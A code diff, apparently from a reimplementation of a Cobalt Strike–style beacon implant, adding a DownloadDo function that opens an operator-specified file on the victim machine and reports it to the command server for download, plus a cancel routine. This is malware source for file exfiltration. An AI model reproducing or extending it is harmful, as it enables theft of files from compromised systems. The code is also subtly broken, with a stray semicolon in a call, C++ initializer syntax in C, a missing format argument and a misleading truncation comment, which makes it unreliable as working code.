@@ -4,26 +4,99 @@
 
 #include "beacon.h"
 
-typedef struct _DOWNLOAD_ENTRY
+typedef struct DOWNLOAD_ENTRY
 {
-	int id;
+	int fid;
 	int remainingData;
 	FILE* file;
 	struct DOWNLOAD_ENTRY* next;
 } DOWNLOAD_ENTRY;
 
 DOWNLOAD_ENTRY* gDownloads = NULL;
+int gDownloadFid = 0;
+
 void DownloadCancel(char* buffer, int length)
 {
 	datap parser;
 	BeaconDataParse(&parser, buffer, length);
-	int id = BeaconDataInt(&parser);
+	int fid = BeaconDataInt(&parser);
 	for (DOWNLOAD_ENTRY* download = gDownloads; download; download = download->next)
 	{
-		if (download->id == id)
+		if (download->fid == fid)
 		{
 			download->remainingData = 0;
 			fclose(download->file);
 		}
 	}
+}
+
+void DownloadDo(char* buffer, int length)
+{
+#define MAX_FILENAME 2048
+#define MAX_BUFFER 2048
+
+	datap* locals = BeaconDataAlloc(MAX_FILENAME + MAX_BUFFER);
+	char* lpFileName = BeaconDataPtr(locals, MAX_FILENAME);
+	char* lpBuffer = BeaconDataPtr(locals, MAX_BUFFER);
+
+	datap parser;
+	BeaconDataParse(&parser, buffer, length);
+	BeaconDataStringCopy(&parser, lpFileName, MAX_FILENAME);
+
+	FILE* file = fopen(lpFileName, "rb");
+	if (file == INVALID_HANDLE_VALUE || file == NULL)
+	{
+		LERROR("Could not open '%s'", lpFileName);
+		BeaconErrorS(ERROR_DOWNLOAD_OPEN_FAILED, lpFileName);
+		goto cleanup;
+	}
+
+	fseek(file, 0, SEEK_END);
+	long long fileSize = _ftelli64(file);
+	fseek(file, 0, SEEK_SET);
+
+	if (fileSize == INVALID_FILE_SIZE)
+	{
+		LERROR("File '%s' is either too large (>4GB) or size check failed");
+		BeaconErrorS(ERROR_DOWNLOAD_SIZE_CHECK_FAILED, lpFileName);
+
+		fclose(file);
+		goto cleanup;
+	}
+
+	fileSize = (int)fileSize; // Now this truncates to 32-bit safely
+
+	int fullPathSize = GetFullPathNameA(lpFileName, MAX_FILENAME, lpBuffer, NULL);
+	if (fullPathSize > MAX_FILENAME)
+	{
+		LERROR("Could not determine full path of '%s'"; , lpFileName);
+		BeaconErrorS(ERROR_DOWNLOAD_PATH_TOO_LONG, lpFileName);
+
+		fclose(file);
+		goto cleanup;
+	}
+
+	DOWNLOAD_ENTRY* download = malloc(sizeof(DOWNLOAD_ENTRY));
+	*download = DOWNLOAD_ENTRY{
+		.fid = gDownloadFid++,
+		.remainingData = fileSize,
+		.file = file,
+		.next = gDownloads
+	};
+	gDownloads = download;
+
+	formatp format;
+	BeaconFormatAlloc(&format, MAX_FILENAME + MAX_BUFFER);
+	BeaconFormatInt(&format, download->fid);
+	BeaconFormatInt(&format, fileSize);
+	BeaconFormatAppend(&format, lpBuffer, fullPathSize);
+
+	int cbLength = BeaconDataLength(&format);
+	char* cbBuffer = BeaconDataOriginal(&format);
+	BeaconOutput(CALLBACK_FILE, cbBuffer, cbLength);
+
+	BeaconFormatFree(&format);
+
+	cleanup:
+	BeaconDataFree(locals);
 }
